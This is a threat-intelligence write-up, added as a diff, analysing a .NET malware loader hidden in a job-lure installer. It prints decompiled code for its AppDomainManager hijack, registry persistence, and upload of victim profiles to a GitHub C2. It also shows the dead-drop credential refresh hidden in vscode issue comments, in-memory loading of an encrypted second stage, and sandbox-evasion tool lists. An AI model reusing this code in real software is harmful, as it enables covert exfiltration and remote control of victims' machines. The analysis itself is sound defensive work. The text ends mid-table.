@@ -1,0 +1,908 @@
+# RuntimeBroker.dll: A New Variant of Blinder Tunnel with Zero AV Detection
+
+
+## Introduction
+
+After reading Palo Alto Unit 42's June 2026 report ["Unraveling the Blinder Tunnel"](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/) on a .NET loader that abuses GitHub as its C2 channel, we went hunting for related samples on VirusTotal. We found one.
+
+`RuntimeBroker.dll` (SHA256: `AA7D4BF74EDACBA06DA7E9D414C0649599FB0E7B118F7C3DDCEC09EB3F720C82`) is a .NET DLL that, as of October 2026, sits at **0 out of 71 detections** on VirusTotal. It was first submitted on 25 August 2026 from the Iraq region. After more than six weeks and multiple rescans, not a single engine flags it.
+
+The sample matches Unit 42's description in its architecture, its victim-ID algorithm, and its use of GitHub issues as a dead drop. But it also shows several changes: a new GitHub account, a Cloudflare Workers relay that was not in the original report, and reversed file roles for the victim profile and license data. The operator is clearly iterating.
+
+We performed a full static reverse engineering of the DLL in dnSpy. We did not run the sample or contact any of its infrastructure.
+
+### Key findings
+
+- **0/71 detection** on VirusTotal after six weeks
+- **Cloudflare Workers relay** (`g-prx.itugegape524.workers.dev`) not documented in prior reporting
+- New GitHub account: `PeakyBlindersTeam` (previously `peakyblinders-tm`)
+- Dead-drop credential rotation via HTML comments in `Microsoft/vscode` issues
+- Delivered inside `StarkMeet (1).zip`, an Inno Setup installer themed as a Dubai Airport careers IT assessment
+- All identifiers obfuscated to Unicode whitespace characters via Obfuscar, all 327 strings XOR-encrypted in a static blob
+
+## Sample overview
+
+| Field | Value |
+|---|---|
+| SHA256 | `AA7D4BF74EDACBA06DA7E9D414C0649599FB0E7B118F7C3DDCEC09EB3F720C82` |
+| File type | .NET DLL, x86, runtime v4.0.30319 |
+| Size | 55,808 bytes |
+| Signature | Unsigned |
+| Obfuscator | Obfuscar 1.0 (identified by DetectItEasy) |
+| PE timestamp | 2081-04-20 (bogus future date) |
+| VT first seen | 2026-08-25 |
+| VT detections | 0/71 (as of 2026-10-06) |
+
+The version resource spoofs Microsoft's legitimate RuntimeBroker:
+
+| Field | Value |
+|---|---|
+| CompanyName | (version `10.0.26100.7019`) |
+| FileDescription | Runtime Broker |
+| LegalCopyright | Microsoft Corporation |
+
+## Provenance: the StarkMeet lure
+
+On VirusTotal, the DLL appears as a child of `StarkMeet (1).zip` (SHA256: `8c68119ebef2ec4be1d57f867ecc1e3606f819bd6278d35a95c6d9b789ac0bfd`), a 1.63 MB Inno Setup installer with 3/67 detections. The installer drops files into a path that includes `DubaiAirport_Carrers_IT_Test`, suggesting a lure themed around Dubai Airport job applications.
+
+The ZIP was first submitted to VT on 25 August 2026 from the Iraq region. Among the dropped files:
+
+- `DubaiAirport_Carrers_IT_Test/.../Resources/RuntimeBroker.exe.config` (the AppDomainManager config that triggers the DLL)
+- `RuntimeBroker.dll` (our sample, 0/72 at drop time)
+
+VT's behavioral data shows the installer's child process `StarkMeet.exe` (10/72) contacting the relay and GitHub endpoints right after execution. Contacted URLs from 25 August 2026:
+
+```
+g-prx.itugegape524.workers.dev/repos/PeakyBlindersTeam/myLic/contents/cd8c5ffad5278fa0/cd8c5ffad5278fa0Lic.txt  (404)
+g-prx.itugegape524.workers.dev/search/issues?q=20260825+repo:Microsoft/vscode+type:issue  (200)
+g-prx.itugegape524.workers.dev/rate_limit  (200)
+```
+
+These URLs confirm the relay, the repository, the victim-ID format, and the dead-drop search pattern. The 404 on the `Lic.txt` path means the operator had not yet placed a license for this victim.
+
+VT also shows the parent dropping `C:\Windows\789zd72.exe` (14/65) and `C:\Windows\n35xaa.exe` (12/71), which may be related payloads delivered through a different channel.
+
+## Execution flow
+
+### AppDomainManager hijack
+
+The DLL does not have a PE entry point. Instead, the class `RuntimeBroker.Init` inherits from `System.AppDomainManager`. When a .NET executable's `.config` file names this DLL as the AppDomainManager, the CLR loads it before the host application's own code runs. This is the entry point:
+
+```csharp
+// Token: 0x02000004 RID: 4
+public sealed class Init : AppDomainManager
+{
+    // Token: 0x06000003 RID: 3 RVA: 0x00002067
+    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
+    {
+        Environment.CurrentDirectory = AppDomain.CurrentDomain.BaseDirectory;
+        if (!AppDomain.CurrentDomain.IsDefaultAppDomain())
+        {
+            return;
+        }
+        PeakyLoader.Main();
+    }
+}
+```
+
+It only runs in the default AppDomain (to avoid executing twice if the assembly is loaded into a child domain later). Then it hands off to `PeakyLoader.Main()`.
+
+### Startup and timer setup
+
+`PeakyLoader.Main()` sets up TLS, installs global exception handlers, creates a hidden tray icon, and spins up the timers that drive the loader's behavior. The full decompiled code:
+
+```csharp
+// Token: 0x06000005 RID: 5 RVA: 0x00002094
+internal static void Main()
+{
+    PeakyLoader.Counter = 0;
+    ServicePointManager.Expect100Continue = true;
+    ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3
+        | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
+
+    Application.SetUnhandledExceptionMode(UnhandledExceptionMode.CatchException);
+    Application.ThreadException += new ThreadExceptionEventHandler(PeakyLoader.OnThreadException);
+    AppDomain.CurrentDomain.UnhandledException += new UnhandledExceptionEventHandler(PeakyLoader.OnUnhandledException);
+    AppDomain.CurrentDomain.ProcessExit += new EventHandler(PeakyLoader.OnSystemShutdown);
+
+    PeakyLoader.TrayIcon.Icon = Icon.FromHandle(new Bitmap(64, 64).GetHicon());
+    PeakyLoader.TrayIcon.MouseMove += new MouseEventHandler(PeakyLoader.DecoyForm_Click);
+    PeakyLoader.TrayIcon.Visible = true;
+
+    for (;;)
+    {
+        try
+        {
+            PeakyLoader.Stage2Timer.Interval = 63000.0;
+            PeakyLoader.Stage2Timer.Elapsed += new ElapsedEventHandler(PeakyLoader.Stage2Loader_Tick);
+            PeakyLoader.Stage2Timer.Start();
+
+            PeakyLoader.PersistenceTimer.Interval = 120000.0;
+            PeakyLoader.PersistenceTimer.Elapsed += new ElapsedEventHandler(PeakyLoader.PersistenceTimer_Tick);
+            PeakyLoader.PersistenceTimer.Start();
+
+            Application.Run();
+        }
+        catch (Exception ex)
+        {
+            PeakyLoader.LogException("Fatal exception", ex);
+            Thread.Sleep(50000);
+        }
+        Thread.Sleep(1500);
+    }
+}
+```
+
+A few things worth noting:
+
+- The outer `for(;;)` loop means that if `Application.Run()` throws, the loader waits 50 seconds, then restarts everything. It never dies.
+- The tray icon is a blank 64x64 bitmap. On the first mouse-move event, it hides itself. This gives the process a message pump (needed for `Application.Run()`) while being essentially invisible.
+- The `ProcessExit` handler calls `ExfilOnLogoff`, which uploads a final profile to `Ex.txt` before the process exits. The operator gets notified when a victim shuts down.
+- `Stage2Timer` fires every 63 seconds (the core C2 loop). `PersistenceTimer` fires after 120 seconds, then switches to hourly.
+
+### Hardcoded configuration
+
+The static fields on the `PeakyLoader` class reveal the hardcoded defaults. These are stored in the encrypted string table and decoded at runtime:
+
+```csharp
+// Static fields (decoded from EncryptedStringTable accessors)
+internal static string VictimId    = CryptoHelpers.GetVictimId("Peaky Blinders 2.1");
+internal static readonly string InstallPath = Environment.GetFolderPath(
+    Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\RuntimeBrokers\\RuntimeBroker.exe";
+internal static string Owner       = "PeakyBlindersTeam";
+internal static string Repo        = "myLic";
+internal static string Token       = "github_pat_11CLITRUI0V<redacted>";
+internal static string UserAgent   = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+                                   + "(KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 Edg/150.0.0.0";
+internal static readonly string Stage2Dll   = "RuntimeBrokerApi.dll";
+internal static readonly string RunKeyName  = "MicrosoftRuntime";
+```
+
+The `Owner`, `Repo`, and `Token` fields are not `readonly`, because the dead-drop mechanism (described below) can replace them at runtime.
+
+## Victim identification
+
+Each infected host gets a 16-character hex ID. The computation is straightforward:
+
+```csharp
+// Token: 0x02000009 RID: 9
+internal class CryptoHelpers
+{
+    // Token: 0x0600002D RID: 45 RVA: 0x000044B4
+    public static string GetVictimId(string salt = null)
+    {
+        SecurityIdentifier user = WindowsIdentity.GetCurrent().User;
+        string text = ((user != null) ? user.Value : null) ?? "unknown")
+            + Environment.MachineName
+            + (Environment.UserDomainName ?? "local");
+        return CryptoHelpers.Sha256Hex(salt + text).Substring(0, 16).ToLower();
+    }
+
+    // Token: 0x0600002E RID: 46 RVA: 0x00004514
+    internal static string Sha256Hex(string input)
+    {
+        using (SHA256 sha = SHA256.Create())
+        {
+            byte[] hash = sha.ComputeHash(Encoding.UTF8.GetBytes(input));
+            StringBuilder sb = new StringBuilder();
+            foreach (byte b in hash)
+            {
+                sb.Append(b.ToString("x2"));
+            }
+            return sb.ToString();
+        }
+    }
+}
+```
+
+The salt is `"Peaky Blinders 2.1"`, the same version string documented by Unit 42. The ID is then used as a folder name in the GitHub repo (`cd8c5ffad5278fa0/cd8c5ffad5278fa0Inf.txt`, for example), creating a per-victim namespace.
+
+## Persistence
+
+The `PersistenceTimer_Tick` handler maintains the `HKCU\...\Run` registry value. It fires after 120 seconds, checks/rewrites the value, then reschedules itself for one hour:
+
+```csharp
+// Token: 0x06000006 RID: 6 RVA: 0x00002238
+private static void PersistenceTimer_Tick(object sender, ElapsedEventArgs e)
+{
+    PeakyLoader.PersistenceTimer.Stop();
+    string keyPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
+
+    if (File.Exists(PeakyLoader.InstallPath))
+    {
+        RegistryKey key = Registry.CurrentUser.OpenSubKey(keyPath, true);
+        if (key != null)
+        {
+            string expected = "\"" + PeakyLoader.InstallPath + "\"";
+            if (PeakyLoader.RegistryValueExists(key, "MicrosoftRuntime", expected))
+            {
+                PeakyLoader.PersistenceStatus = "Executable is already persisted in registry";
+            }
+            else
+            {
+                PeakyLoader.RegistrySetValue(key, "MicrosoftRuntime", expected);
+                PeakyLoader.PersistenceStatus = "Executable persisted in registry";
+            }
+        }
+        else
+        {
+            PeakyLoader.PersistenceStatus = "Registry key not found";
+        }
+    }
+    else
+    {
+        PeakyLoader.PersistenceStatus = "Executable not found OR run as system";
+    }
+
+    PeakyLoader.PersistenceTimer.Interval = 3600000.0;  // switch to hourly
+    PeakyLoader.PersistenceTimer.Start();
+}
+```
+
+The persistence status string (`"Executable is already persisted in registry"`, `"Executable persisted in registry"`, etc.) is included in every profile upload. This gives the operator visibility into whether persistence survived across reboots.
+
+## Core C2 loop
+
+The `Stage2Loader_Tick` handler fires every 63 seconds. It hides the tray icon (if still visible), then calls `GetDataFilePath()` to interact with the GitHub C2, and if a valid license comes back, calls `HasInitializeNewDomain()` to decrypt and run the second stage:
+
+```csharp
+// Token: 0x06000009 RID: 9 RVA: 0x00002330
+private static void Stage2Loader_Tick(object sender, ElapsedEventArgs e)
+{
+    PeakyLoader.Stage2Timer.Stop();
+    try
+    {
+        if (PeakyLoader.TrayIcon != null)
+        {
+            PeakyLoader.TrayIcon.Visible = false;
+        }
+        PeakyLoader.Stage2Timer.Enabled = !PeakyLoader.HasInitializeNewDomain(
+            Path.Combine(Path.GetDirectoryName(PeakyLoader.InstallPath), PeakyLoader.Stage2Dll),
+            PeakyLoader.GetDataFilePath());
+    }
+    catch (Exception)
+    {
+        PeakyLoader.Stage2Timer.Start();
+    }
+}
+```
+
+If `HasInitializeNewDomain` returns `true` (second stage loaded successfully), the timer is disabled and the loader's job is done. If it fails, the timer restarts for the next cycle.
+
+### Profile upload (ExfilVictimInfo)
+
+`GetDataFilePath()` calls `ExfilVictimInfo` to upload the victim profile, then calls `GitHubC2Command` to fetch the license. The profile upload is the most complex method in the loader. Here is the relevant portion:
+
+```csharp
+// Token: 0x0600000C RID: 12 RVA: 0x000024F8
+internal static bool ExfilVictimInfo(string owner, string repo, string path, string token)
+{
+    try
+    {
+        WebClient webClient = new WebClient();
+        if (PeakyLoader.UseProxy)
+        {
+            webClient.Proxy = WebRequest.GetSystemWebProxy();
+            webClient.Proxy.Credentials = CredentialCache.DefaultCredentials;
+        }
+        webClient.Headers[HttpRequestHeader.Accept] = "application/vnd.github.v3+json";
+        webClient.Headers[HttpRequestHeader.ContentType] = "application/json";
+        webClient.Headers[HttpRequestHeader.Authorization] = "Token " + token;
+        webClient.Headers[HttpRequestHeader.UserAgent] = PeakyLoader.UserAgent;
+
+        string profile = Convert.ToBase64String(Encoding.UTF8.GetBytes(
+            "MachineName: " + Environment.MachineName
+            + "\r\nUserName: " + Environment.UserDomainName + "\\" + Environment.UserName
+            + "\r\nLogonServer: " + Environment.GetEnvironmentVariable("LOGONSERVER")
+            + "\r\n" + SandboxChecks.GetAllCheckResults()
+            + "\r\nPersistance: " + PeakyLoader.PersistenceStatus
+            + "\r\n" + DateTime.Now.ToString(CultureInfo.CurrentCulture)));
+
+        string body = "{\"message\":\"Commit message\",\"content\":\"" + profile + "\",\"sha\":null}";
+        string url = "https://api.github.com/repos/" + owner + "/" + repo + "/contents/" + path;
+
+        // GET the current file to retrieve its SHA (needed for updates)
+        try
+        {
+            byte[] response = webClient.DownloadData(url);
+            string json = Encoding.UTF8.GetString(response);
+            // extract "sha":"..." from response
+            Regex shaRegex = new Regex("\"sha\":\"(.*?)\"");
+            if (shaRegex.IsMatch(json))
+            {
+                string sha = shaRegex.Matches(json)[0].Value.Substring(8, ...);
+                body = "{\"message\":\"Commit message\",\"content\":\""
+                    + profile + "\",\"sha\":\"" + sha + "\"}";
+            }
+        }
+        catch (WebException ex)
+        {
+            HttpWebResponse resp = ex.Response as HttpWebResponse;
+            if (resp != null)
+            {
+                if (resp.StatusCode == HttpStatusCode.Unauthorized)    // 401
+                {
+                    // token is dead, try dead-drop refresh
+                    if (!PeakyLoader.PollIssueCommands("Microsoft", "vscode", PeakyLoader.UseProxy))
+                    {
+                        Thread.Sleep(3600000);  // 1 hour
+                    }
+                    return true;
+                }
+                if (resp.StatusCode == HttpStatusCode.Forbidden)       // 403
+                {
+                    Thread.Sleep(3600000);
+                    return true;
+                }
+                if (resp.StatusCode == HttpStatusCode.NotFound)        // 404
+                {
+                    // check if user/repo still exist
+                    // if not, try dead-drop refresh
+                    // if yes, create the file (first upload for this victim)
+                }
+            }
+        }
+
+        // PUT the updated profile
+        webClient.UploadData(url, "PUT", Encoding.ASCII.GetBytes(body));
+        return true;
+    }
+    catch (Exception)
+    {
+        return false;
+    }
+}
+```
+
+A few things to notice here:
+
+1. **Every request goes through the GitHub Contents API** (`/repos/{owner}/{repo}/contents/{path}`). The loader reads the file to get the current SHA, then PUTs the updated content back. This produces a commit on every cycle, roughly once per minute.
+
+2. **The profile is base64-encoded** and placed directly in the JSON body. It contains the machine name, domain, user, logon server, persistence status, all sandbox check results, and the current timestamp.
+
+3. **Error handling drives the dead-drop mechanism.** When the GitHub token returns 401 (Unauthorized), the loader calls `PollIssueCommands("Microsoft", "vscode", ...)` to search for fresh credentials in vscode issue comments. On 403 (Forbidden/rate limited), it just sleeps for an hour. On 404, it checks whether the user and repo still exist; if they don't, it also falls back to the dead drop.
+
+4. **Proxy support.** On the first attempt, the loader connects directly. If that fails, `UseProxy` is set to `true` and all subsequent requests go through the system proxy with the logged-in user's default credentials. This helps the loader work behind corporate proxies.
+
+### License fetch and clear (GitHubC2Command)
+
+After uploading the profile, the loader fetches the license file. If it contains data, the loader base64-decodes it, then immediately overwrites the file with a newline character, making each license a one-time-use value:
+
+```csharp
+// Token: 0x06000014 RID: 20 RVA: 0x00003240
+internal static string GitHubC2Command(string owner, string repo, string path,
+    string token, bool useProxy)
+{
+    try
+    {
+        string content = "";
+        WebClient webClient = new WebClient();
+        // ... setup headers ...
+
+        string clearContent = Convert.ToBase64String(Encoding.UTF8.GetBytes("\n"));
+        string clearBody = "{\"message\":\"Commit message\",\"content\":\""
+            + clearContent + "\",\"sha\":null}";
+
+        string url = "https://api.github.com/repos/" + owner + "/" + repo
+            + "/contents/" + path;
+
+        byte[] response = webClient.DownloadData(url);
+        string json = Encoding.UTF8.GetString(response);
+
+        // extract "content":"..." from the response
+        Regex contentRegex = new Regex("\"content\":\"(.*?)\"");
+        if (contentRegex.IsMatch(json))
+        {
+            MatchCollection matches = contentRegex.Matches(json);
+            content = Encoding.UTF8.GetString(Convert.FromBase64String(
+                matches[0].Value.Substring(12, ...)
+                    .Replace("\\n", string.Empty)));
+
+            // get SHA for the update
+            MatchCollection shaMatches = new Regex("\"sha\":\"(.*?)\"").Matches(json);
+            string sha = shaMatches[0].Value.Substring(8, ...);
+            clearBody = "{\"message\":\"Commit message\",\"content\":\""
+                + clearContent + "\",\"sha\":\"" + sha + "\"}";
+        }
+
+        // if content was not just a newline, clear it
+        if (content != "\n")
+        {
+            webClient.UploadData(url, "PUT", Encoding.ASCII.GetBytes(clearBody));
+        }
+
+        return content.TrimEnd('\n');
+    }
+    catch (Exception)
+    {
+    }
+    return null;
+}
+```
+
+The operator workflow becomes clear: to deliver a payload to a specific victim, the operator writes the AES decryption key into that victim's `Lic.txt`. The loader picks it up within 63 seconds, decrypts `RuntimeBrokerApi.dll` with it, and runs the result. The license is immediately wiped so it cannot be replayed.
+
+### Second-stage decryption and loading
+
+When a license comes back non-empty, the loader decrypts `RuntimeBrokerApi.dll` from disk and loads it in-memory:
+
+```csharp
+// Token: 0x06000015 RID: 21 RVA: 0x000034E8
+internal static byte[] DecryptFileWithPassword(string filePath, string password)
+{
+    try
+    {
+        byte[] key = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(password));
+        byte[] iv = new byte[16];
+        Array.Copy(key, iv, Math.Min(iv.Length, key.Length));
+        byte[] encrypted = File.ReadAllBytes(filePath);
+
+        using (Aes aes = Aes.Create())
+        {
+            aes.Key = key;       // full 32-byte SHA-256 hash = AES-256
+            aes.IV = iv;         // first 16 bytes of that hash
+            ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV);
+
+            using (MemoryStream ms = new MemoryStream(encrypted))
+            using (CryptoStream cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
+            using (MemoryStream result = new MemoryStream())
+            {
+                cs.CopyTo(result);
+                return result.ToArray();
+            }
+        }
+    }
+    catch (Exception)
+    {
+    }
+    return null;
+}
+```
+
+The decrypted bytes are then loaded as a .NET assembly, and the loader looks for a method named `InitializeNewDomain` to invoke:
+
+```csharp
+// Token: 0x0600000B RID: 11 RVA: 0x0000246C
+internal static bool HasInitializeNewDomain(string dllPath, string password)
+{
+    try
+    {
+        foreach (Type type in Assembly.Load(
+            PeakyLoader.DecryptFileWithPassword(dllPath, password)).GetTypes())
+        {
+            MethodInfo method = type.GetMethod("InitializeNewDomain",
+                BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
+            if (method != null)
+            {
+                object instance = Activator.CreateInstance(type);
+                AppDomainSetup setup = new AppDomainSetup();
+                method.Invoke(instance, new object[] { setup });
+                return true;
+            }
+        }
+    }
+    catch (Exception)
+    {
+    }
+    return false;
+}
+```
+
+The second stage must also implement `InitializeNewDomain`, continuing the AppDomainManager pattern. The loader creates an instance of the type and invokes the method with a fresh `AppDomainSetup`. This is a neat trick: the second stage mimics the same entry-point signature as the loader itself, which means it could also be deployed as a standalone AppDomainManager DLL if needed.
+
+`RuntimeBrokerApi.dll` was not present in our sample, so the second stage remains unknown.
+
+## Dead-drop credential refresh via GitHub issues
+
+This is the most interesting mechanism in the loader. When the GitHub token stops working (401 Unauthorized) or the repo disappears (404), the loader searches for fresh credentials hidden in the comments of public GitHub issues.
+
+```csharp
+// Token: 0x0600000E RID: 14 RVA: 0x00002BC8
+public static bool PollIssueCommands(string org, string repo, bool useProxy)
+{
+    try
+    {
+        WebClient webClient = new WebClient();
+        if (useProxy)
+        {
+            webClient.Proxy = WebRequest.GetSystemWebProxy();
+            webClient.Proxy.Credentials = CredentialCache.DefaultCredentials;
+        }
+        webClient.Headers[HttpRequestHeader.UserAgent] = PeakyLoader.UserAgent;
+
+        string today = DateTime.Today.ToString("yyyyMMdd");
+        string searchUrl = "https://api.github.com/search/issues?q="
+            + today + "+repo:" + org + "/" + repo + "+type:issue";
+
+        MatchCollection issues = Regex.Matches(
+            webClient.DownloadString(searchUrl),
+            "\"comments_url\":\"(.*?)\"");
+
+        if (issues.Count == 0)
+            return false;
+
+        foreach (Match issue in issues)
+        {
+            string commentsUrl = issue.Groups[1].Value;
+            try
+            {
+                webClient.Headers[HttpRequestHeader.UserAgent] = PeakyLoader.UserAgent;
+                string commentsJson = webClient.DownloadString(commentsUrl);
+
+                MatchCollection bodies = Regex.Matches(commentsJson,
+                    "\"body\":\"(.*?)\"");
+                MatchCollection dates = Regex.Matches(commentsJson,
+                    "\"updated_at\":\"(.*?)\"");
+
+                for (int i = 0; i < bodies.Count; i++)
+                {
+                    string body = Regex.Unescape(bodies[i].Groups[1].Value);
+
+                    // look for HTML comment markers
+                    if (body.Contains("<!--") && body.Contains("-->"))
+                    {
+                        // extract content between <!-- and -->
+                        Match match = Regex.Match(body,
+                            "<!--(.*?)-->", RegexOptions.Singleline);
+
+                        if (match.Success)
+                        {
+                            string ciphertext = match.Groups[1].Value
+                                .Replace(today, "")
+                                .Replace("\\r", "").Replace("\\n", "")
+                                .Replace("<!--", "").Replace("-->", "");
+
+                            // derive key from date + victim ID
+                            byte[] key = MD5.Create().ComputeHash(
+                                Encoding.UTF8.GetBytes(today + PeakyLoader.VictimId));
+                            byte[] iv = MD5.Create().ComputeHash(key);
+
+                            // decrypt five times
+                            string plaintext = PeakyLoader.AesDecryptIterated(
+                                ciphertext, key, iv, 5);
+
+                            // extract new credentials
+                            PeakyLoader.Owner = Regex.Match(plaintext,
+                                "Owner=(\\w+)").Groups[1].Value;
+                            PeakyLoader.Repo = Regex.Match(plaintext,
+                                "LicRepo=(\\w+)").Groups[1].Value;
+                            PeakyLoader.Token = Regex.Match(plaintext,
+                                "LicToken=(\\w+)").Groups[1].Value;
+
+                            return true;
+                        }
+                        return false;
+                    }
+                }
+            }
+            catch (Exception) { }
+        }
+    }
+    catch (Exception)
+    {
+        return false;
+    }
+    return false;
+}
+```
+
+And the iterated AES decryption:
+
+```csharp
+// Token: 0x06000012 RID: 18 RVA: 0x00003100
+public static string AesDecryptIterated(string ciphertext, byte[] key, byte[] iv, int rounds)
+{
+    string text = ciphertext;
+    for (int i = 0; i < rounds; i++)
+    {
+        text = PeakyLoader.AesDecrypt(text, key, iv);
+    }
+    return text;
+}
+
+// Token: 0x06000013 RID: 19 RVA: 0x00003128
+public static string AesDecrypt(string base64Input, byte[] key, byte[] iv)
+{
+    if (key.Length != 16 && key.Length != 24 && key.Length != 32)
+        throw new Exception("AES key length must be 16, 24, or 32 bytes");
+    if (iv.Length != 16)
+        throw new Exception("AES IV length must be 16 bytes");
+
+    byte[] encrypted = Convert.FromBase64String(base64Input);
+    using (Aes aes = Aes.Create())
+    {
+        aes.Key = key;
+        aes.IV = iv;
+        aes.Mode = CipherMode.CBC;
+        aes.Padding = PaddingMode.PKCS7;
+        using (ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
+        using (MemoryStream ms = new MemoryStream(encrypted))
+        using (CryptoStream cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
+        using (StreamReader reader = new StreamReader(cs))
+        {
+            return reader.ReadToEnd();
+        }
+    }
+}
+```
+
+Here is what makes this mechanism interesting:
+
+1. **The search targets `Microsoft/vscode`**, one of the most active repositories on GitHub. Dozens of new issues appear every day. An HTML comment with base64 text buried in a comment would be nearly impossible to spot manually.
+
+2. **The decryption key is per-victim.** The key is `MD5(yyyyMMdd + victimId)`, and the IV is `MD5(key)`. A comment only decrypts correctly for the victim it was meant for. This means the operator can post credentials for a specific host in a public place without anyone else being able to read them.
+
+3. **Keys rotate daily.** The date is part of the key material, so yesterday's comments are useless today.
+
+4. **Five iterations of AES-128-CBC.** Not strong cryptography, but enough to prevent casual base64-decode-and-read.
+
+5. **The plaintext must contain `Owner=`, `LicRepo=`, and `LicToken=`.** These replace the hardcoded defaults in the `PeakyLoader` static fields. The operator can point the loader at a completely different GitHub account and repo without ever touching the implant binary.
+
+## Shutdown exfiltration
+
+The `ProcessExit` handler uploads a final profile when the victim machine shuts down or the user logs off:
+
+```csharp
+// Token: 0x0600001A RID: 26 RVA: 0x00003698
+private static void OnSystemShutdown(object sender, EventArgs e)
+{
+    PeakyLoader.TrayIcon.Visible = false;
+    PeakyLoader.TrayIcon.Dispose();
+    PeakyLoader.ExfilOnLogoff(PeakyLoader.Owner, PeakyLoader.Repo,
+        PeakyLoader.VictimId + "/" + PeakyLoader.VictimId + "Ex.txt",
+        PeakyLoader.Token);
+}
+```
+
+The profile goes to `Ex.txt` (as opposed to `Inf.txt` for regular check-ins). The content is identical to a normal profile upload but prefixed with `"Windows shutdown/logoff"`. This gives the operator a notification that the victim went offline, along with the last sandbox check results and persistence status.
+
+## Environment checks: reported, not acted on
+
+The `SandboxChecks` class runs 11 different checks and concatenates the results into a single string. This string goes into every profile upload. Crucially, **none of these checks cause the loader to exit**. The operator sees the results and decides whether to proceed.
+
+The full `GetAllCheckResults` aggregator:
+
+```csharp
+// Token: 0x0600001D RID: 29 RVA: 0x000037B4
+internal static string GetAllCheckResults()
+{
+    return SandboxChecks.GetCurrentProcessName()
+        + "\r\n" + SandboxChecks.GetCurrentProcessPath()
+        + "\r\n" + SandboxChecks.CheckVirtualMachine()
+        + "\r\n" + SandboxChecks.CheckSandboxProcesses()
+        + "\r\n" + SandboxChecks.CheckSystemInfoAndBios()
+        + "\r\n" + SandboxChecks.CheckHardwareCharacteristics()
+        + "\r\n" + SandboxChecks.CheckParentProcess()
+        + "\r\n" + SandboxChecks.CheckAnalysisTools()
+        + "\r\n" + SandboxChecks.CheckTimingAnalysis()
+        + "\r\n" + SandboxChecks.CheckSandboxRegistryAndFiles()
+        + "\r\n" + SandboxChecks.CheckVirtualHardware();
+}
+```
+
+Each check returns a prefixed string: `ALARM:` if the check triggered, `INFO:` if it passed, or `ERR:` if it threw an exception. Some examples from the decompiled code:
+
+**VM detection via WMI:**
+
+```csharp
+// Token: 0x06000023 RID: 35 RVA: 0x00003B24
+internal static string CheckVirtualMachine()
+{
+    using (ManagementObjectSearcher searcher =
+        new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
+    {
+        foreach (ManagementBaseObject obj in searcher.Get())
+        {
+            string manufacturer = obj["Manufacturer"]?.ToString().ToLower() ?? "";
+            string model = obj["Model"]?.ToString().ToLower() ?? "";
+
+            if (manufacturer.Contains("vmware")
+                || manufacturer.Contains("virtualbox")
+                || model.Contains("vmware")
+                || model.Contains("virtualbox")
+                || (manufacturer.Contains("microsoft") && model.Contains("virtual")))
+            {
+                return "ALARM: Virtual machine detected. Manufacturer: "
+                    + manufacturer + " Model: " + model;
+            }
+        }
+    }
+    return "INFO: Sandbox Not Detected by CheckVirtualMachine";
+}
+```
+
+**Analysis tool detection:**
+
+```csharp
+// Token: 0x06000028 RID: 40 RVA: 0x000042AC
+internal static string CheckAnalysisTools()
+{
+    Process[] processes = Process.GetProcesses();
+    string[] tools = new string[]
+    {
+        "wireshark", "fiddler", "processmonitor", "regmon", "procmon",
+        "filemon", "procexp", "netmon", "vmtoolsd", "vboxtray",
+        "vboxservice", "sandboxie", "ollydbg", "ida", "x32dbg",
+        "x64dbg", "windbg"
+    };
+
+    foreach (Process proc in processes)
+    {
+        string name = proc.ProcessName.ToLower();
+        if (Array.Exists(tools, t => name.Contains(t)))
+        {
+            return "ALARM: Sandbox Specific Processes detected (possible sandbox)";
+        }
+    }
+    return "INFO: Sandbox Not Detected by Sandbox Specific Processes";
+}
+```
+
+**Hardware fingerprinting:**
+
+```csharp
+// Token: 0x06000027 RID: 39 RVA: 0x00004168
+internal static string CheckHardwareCharacteristics()
+{
+    if (Environment.ProcessorCount < 2)
+        return "ALARM: Limited Number of Processors detected (possible sandbox)";
+
+    // check RAM via WMI
+    // ... if TotalPhysicalMemory < 2 GB ...
+    //     return "ALARM: Less than 2GB of RAM detected (possible sandbox)";
+
+    foreach (DriveInfo drive in DriveInfo.GetDrives())
+    {
+        if (drive.IsReady && drive.DriveType == DriveType.Fixed)
+        {
+            double sizeGB = (double)drive.TotalSize / 1073741824.0;
+            if (sizeGB < 50.0)
+                return string.Format(
+                    "ALARM: Small Disk Size detected ({0} GB, possible sandbox)", sizeGB);
+        }
+    }
+    return "INFO: Sandbox Not Detected by Check Hardware Characteristics";
+}
+```
+
+**Timing analysis:**
+
+```csharp
+// Token: 0x06000029 RID: 41 RVA: 0x000043E8
+internal static string CheckTimingAnalysis()
+{
+    Stopwatch sw = new Stopwatch();
+    sw.Start();
+    for (int i = 0; i < 10000000; i++)
+    {
+        Math.Sqrt((double)i);
+    }
+    sw.Stop();
+    if (sw.ElapsedMilliseconds > 2000)
+        return "ALARM: Timing analysis detected (possible sandbox)";
+
+    sw.Reset();
+    sw.Start();
+    Thread.Sleep(1000);
+    sw.Stop();
+    if (sw.ElapsedMilliseconds < 900 || sw.ElapsedMilliseconds > 1100)
+        return "ALARM: Timing analysis detected (possible sandbox)";
+
+    return "INFO: Sandbox Not Detected by Timing analysis";
+}
+```
+
+The complete list of checks and what they look for:
+
+| Check | What it looks for |
+|---|---|
+| GetCurrentProcessName | Reports the process name |
+| GetCurrentProcessPath | Reports the full executable path |
+| CheckVirtualMachine | WMI `Win32_ComputerSystem` manufacturer/model containing vmware, virtualbox, microsoft+virtual |
+| CheckSandboxProcesses | Running processes: vmsrvc, vmtools, xenservice, vboxservice, vboxtray |
+| CheckSystemInfoAndBios | WMI `Win32_ComputerSystem` + `Win32_BIOS` for qemu, kvm, xen, parallels, bochs, innotek |
